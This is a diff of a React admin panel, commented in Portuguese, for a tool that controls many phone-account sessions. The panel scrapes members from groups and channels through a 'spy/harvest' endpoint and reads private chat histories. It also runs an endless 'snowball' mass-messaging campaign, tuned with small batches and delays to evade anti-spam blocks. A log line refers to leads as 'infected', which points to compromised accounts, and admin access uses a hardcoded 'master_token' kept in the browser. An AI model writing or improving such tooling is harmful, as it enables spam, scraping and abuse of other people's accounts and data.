@@ -1,26 +1,27 @@
 import { useState, useEffect, useRef } from 'react';
 
 export default function AdminPanel() {
-  // --- SEUS ESTADOS ORIGINAIS + CORREÇÃO DE OWNER ---
+  // --- ESTADOS ORIGINAIS DO SEU LAYOUT ---
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [loginMode, setLoginMode] = useState('user'); // 'user' ou 'admin'
   const [usernameInput, setUsernameInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
   const [adminTokenInput, setAdminTokenInput] = useState('');
+  const [authToken, setAuthToken] = useState(''); // Seu token original
   const [isAdmin, setIsAdmin] = useState(false);
   
-  // ESTADO CRUCIAL PARA CORRIGIR O CARREGAMENTO DE DADOS
+  // --- NOVO ESTADO ESSENCIAL (CORREÇÃO DE DADOS) ---
   const [ownerId, setOwnerId] = useState(''); 
 
   // --- NAVEGAÇÃO ---
   const [tab, setTab] = useState('dashboard'); 
   
-  // --- DADOS DO SISTEMA ---
+  // --- DADOS ---
   const [sessions, setSessions] = useState([]);
   const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
   const [logs, setLogs] = useState([]);
   
-  // --- ESTADOS DO CRM (BOLA DE NEVE) ---
+  // --- CRM ---
   const [processing, setProcessing] = useState(false);
   const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
   const [imgUrl, setImgUrl] = useState(''); 
@@ -29,7 +30,7 @@ export default function AdminPanel() {
   const [checkingStatus, setCheckingStatus] = useState(false);
   const stopCampaignRef = useRef(false);
 
-  // --- ESTADOS DO GOD MODE ---
+  // --- GOD MODE ---
   const [allGroups, setAllGroups] = useState([]);
   const [allChannels, setAllChannels] = useState([]);
   const [harvestedIds, setHarvestedIds] = useState(new Set());
@@ -40,7 +41,7 @@ export default function AdminPanel() {
   const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
   const stopHarvestRef = useRef(false);
 
-  // --- ESTADOS DE FERRAMENTAS ---
+  // --- TOOLS ---
   const [viewingChat, setViewingChat] = useState(null);
   const [chatHistory, setChatHistory] = useState([]);
   const [loadingHistory, setLoadingHistory] = useState(false);
@@ -51,33 +52,33 @@ export default function AdminPanel() {
 
   // --- INICIALIZAÇÃO CORRIGIDA ---
   useEffect(() => {
+    // Restaura sessão do localStorage
     const savedOwner = localStorage.getItem('hottrack_owner');
     const savedIsAdmin = localStorage.getItem('hottrack_is_admin') === 'true';
-    
-    // Recupera dados salvos do God Mode
+    const savedToken = localStorage.getItem('hottrack_token');
+
+    // Restaura God Mode
     const savedGroups = localStorage.getItem('godModeGroups');
     const savedChannels = localStorage.getItem('godModeChannels');
     if (savedGroups) setAllGroups(JSON.parse(savedGroups));
     if (savedChannels) setAllChannels(JSON.parse(savedChannels));
 
-    // Se já tiver login salvo, carrega tudo
     if (savedOwner) {
         setOwnerId(savedOwner);
+        setAuthToken(savedToken || '');
         setIsAuthenticated(true);
         setIsAdmin(savedIsAdmin);
-        // Pequeno delay para garantir que o estado atualizou antes do fetch
-        setTimeout(() => fetchData(savedOwner), 100);
+        // Força carregamento imediato
+        fetchData(savedOwner);
     }
   }, []);
 
-  // --- FUNÇÃO FETCH CORRIGIDA (O PULO DO GATO) ---
+  // --- FUNÇÃO DE DADOS (CORRIGIDA) ---
   const fetchData = async (currentUser = ownerId) => {
-    if (!currentUser) return; // Não tenta buscar sem dono
-    
+    if (!currentUser) return; // Segurança: não busca se não tiver dono
     try {
-      const timestamp = Date.now(); // Evita cache
-      
-      // 1. LISTAR SESSÕES (Passando ownerId)
+      const timestamp = Date.now();
+      // Envia ownerId na URL para o backend saber o que devolver
       const sRes = await fetch(`/api/list-sessions?ownerId=${currentUser}&_t=${timestamp}`);
       const sData = await sRes.json();
       if (sData.sessions) {
@@ -90,21 +91,19 @@ export default function AdminPanel() {
           });
       }
 
-      // 2. STATS (Passando ownerId)
       const stRes = await fetch(`/api/stats?ownerId=${currentUser}&_t=${timestamp}`);
       if (stRes.ok) setStats(await stRes.json());
       
-      // 3. COLHIDOS (Passando ownerId)
       const hRes = await fetch(`/api/get-harvested?ownerId=${currentUser}&_t=${timestamp}`);
       const hData = await hRes.json();
       if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));
 
-    } catch (e) { console.error("Erro dados:", e); }
+    } catch (e) { console.error("Erro ao carregar dados:", e); }
   };
 
   const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
 
-  // --- SEU LOGIN ORIGINAL (INTEGRADO) ---
+  // --- SEU LOGIN ORIGINAL (ADAPTADO) ---
   const handleLogin = async (e) => {
     e.preventDefault();
     
@@ -118,14 +117,18 @@ export default function AdminPanel() {
             const data = await res.json();
             
             if(data.success) { 
-                // Define o dono baseado na resposta da API ou no input
+                // Define o dono
                 const user = data.ownerId || usernameInput || 'partner';
+                const token = data.token || 'valid';
+                
                 setIsAuthenticated(true);
                 setOwnerId(user);
+                setAuthToken(token);
                 setIsAdmin(false);
                 
-                // Persistência
+                // Salva tudo
                 localStorage.setItem('hottrack_owner', user);
+                localStorage.setItem('hottrack_token', token);
                 localStorage.setItem('hottrack_is_admin', 'false');
                 
                 fetchData(user);
@@ -139,8 +142,12 @@ export default function AdminPanel() {
             setIsAuthenticated(true);
             setOwnerId('admin');
             setIsAdmin(true);
+            setAuthToken('master_token');
+            
             localStorage.setItem('hottrack_owner', 'admin');
+            localStorage.setItem('hottrack_token', 'master_token');
             localStorage.setItem('hottrack_is_admin', 'true');
+            
             fetchData('admin');
         } else {
             alert('Token inválido');
@@ -150,30 +157,31 @@ export default function AdminPanel() {
 
   const logout = () => {
       localStorage.removeItem('hottrack_owner');
+      localStorage.removeItem('hottrack_token');
       localStorage.removeItem('hottrack_is_admin');
       window.location.reload();
   };
 
   // ==============================================================================
-  // MOTOR V7 (BOLA DE NEVE + FURTIVO) NO SEU LAYOUT
+  // MOTOR DE DISPARO V7 (BOLA DE NEVE + FURTIVO + ANTI-FLOOD)
   // ==============================================================================
   const startRealCampaign = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      
-     if(!confirm(`⚠️ INICIAR BOLA DE NEVE?\n\n- Modo Infinito (Espera novos leads)\n- Anti-Flood Ativo\n- Contas: ${selectedPhones.size}`)) return;
+     if(!confirm(`⚠️ INICIAR BOLA DE NEVE?\n\n- Modo Infinito (Espera novos leads)\n- Anti-Flood Ativo (Lotes pequenos)\n- Contas: ${selectedPhones.size}`)) return;
 
      setProcessing(true);
      stopCampaignRef.current = false;
      setProgress(0);
-     addLog('❄️ BOLA DE NEVE ATIVA: Aguardando e disparando...');
+     addLog('❄️ BOLA DE NEVE INICIADA: Aguardando e disparando...');
      
      try {
          let availableSenders = Array.from(selectedPhones);
          const floodCoolDown = new Map(); 
 
-         // CONFIGURAÇÃO FURTIVA (STEALTH)
-         const BATCH_SIZE = 5; // Apenas 5 por vez (Segurança máxima)
-         const DELAY_MS = 8000; // 8 segundos de pausa (Segurança máxima)
+         // --- CONFIGURAÇÃO STEALTH (Anti-Bloqueio) ---
+         const BATCH_SIZE = 5; // Apenas 5 mensagens por rodada
+         const DELAY_MS = 8000; // 8 segundos de pausa entre rodadas
          const LEADS_PER_FETCH = 200;
          
          let totalSentSession = 0;
@@ -181,36 +189,36 @@ export default function AdminPanel() {
          while (true) {
              if (stopCampaignRef.current) { addLog('🛑 Parada manual.'); break; }
 
-             // Gestão de Geladeira (Anti-Flood)
+             // 1. Recupera contas da Geladeira
              const now = Date.now();
              for (const [phone, unlockTime] of floodCoolDown.entries()) {
                  if (now > unlockTime) {
                      availableSenders.push(phone);
                      floodCoolDown.delete(phone);
-                     addLog(`🔥 Conta ${phone} pronta.`);
+                     addLog(`🔥 Conta ${phone} saiu do descanso.`);
                  }
              }
 
              if (availableSenders.length === 0) {
-                 addLog('⏳ Pausa geral (Recuperando Contas). Aguardando 1 min...');
+                 addLog('⏳ Todas contas em pausa (Flood). Aguardando 1 min...');
                  await new Promise(r => setTimeout(r, 60000));
                  continue;
              }
 
-             // Busca Leads (Passando ownerId para isolar dados)
+             // 2. Busca Leads PENDENTES (Passando ownerId!)
              const res = await fetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}&ownerId=${ownerId}`);
              const data = await res.json();
              const leads = data.leads || [];
              
-             // --- LÓGICA BOLA DE NEVE ---
-             // Se não tem leads, não para. Espera entrar novos (pelo Auto-Harvest).
+             // 3. MODO BOLA DE NEVE: Se acabar, espera!
              if (leads.length === 0) {
-                 addLog('❄️ Sem leads na fila. Aguardando novos infectados (30s)...');
+                 addLog('❄️ Fila vazia. Aguardando novos leads (30s)...');
                  await new Promise(r => setTimeout(r, 30000)); 
-                 fetchData(ownerId); // Atualiza os contadores na tela
+                 fetchData(ownerId); 
                  continue; 
              }
 
+             // 4. Processa os Leads
              for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                  if (stopCampaignRef.current) break;
 
@@ -232,7 +240,7 @@ export default function AdminPanel() {
                                  message: msg, 
                                  imageUrl: imgUrl, 
                                  leadDbId: lead.id,
-                                 ownerId: ownerId // Importante passar o dono
+                                 ownerId: ownerId // Correção: Envia o dono!
                              })
                          });
                          
@@ -251,7 +259,7 @@ export default function AdminPanel() {
                  
                  await new Promise(r => setTimeout(r, DELAY_MS));
              }
-             fetchData(ownerId); // Atualiza tela a cada lote
+             fetchData(ownerId);
          }
      } catch (e) { addLog(`⛔ Erro: ${e.message}`); }
      setProcessing(false);
@@ -259,7 +267,7 @@ export default function AdminPanel() {
 
   const stopCampaign = () => { stopCampaignRef.current = true; addLog('🛑 Parando...'); };
 
-  // --- OUTRAS FUNÇÕES ---
+  // --- OUTRAS FUNÇÕES (TODAS CORRIGIDAS COM ownerId) ---
   const checkAllStatus = async () => {
       if(sessions.length === 0) return;
       setCheckingStatus(true);
@@ -308,7 +316,7 @@ export default function AdminPanel() {
           try {
               const res = await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: targets[i].ownerPhone, chatId: targets[i].id, chatName: targets[i].title, isChannel: targets[i].type === 'Canal', ownerId }), headers: {'Content-Type': 'application/json'} });
               const data = await res.json();
-              if(data.success) { count += data.count; setTotalHarvestedSession(count); setHarvestedIds(prev => new Set(prev).add(targets[i].id)); addLog(`✅ +${data.count} leads de ${targets[i].title}`); }
+              if(data.success) { count += data.count; setTotalHarvestedSession(count); setHarvestedIds(prev => new Set(prev).add(targets[i].id)); addLog(`✅ +${data.count} de ${targets[i].title}`); }
           } catch (e) {}
           await new Promise(r => setTimeout(r, 2000));
       }
@@ -368,7 +376,7 @@ export default function AdminPanel() {
   const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
   const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;
 
-  // --- SEU LAYOUT ORIGINAL ---
+  // --- SEU LAYOUT ORIGINAL MANTIDO ---
   if (!isAuthenticated) return (
       <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
           <form onSubmit={handleLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', width:'350px'}}>
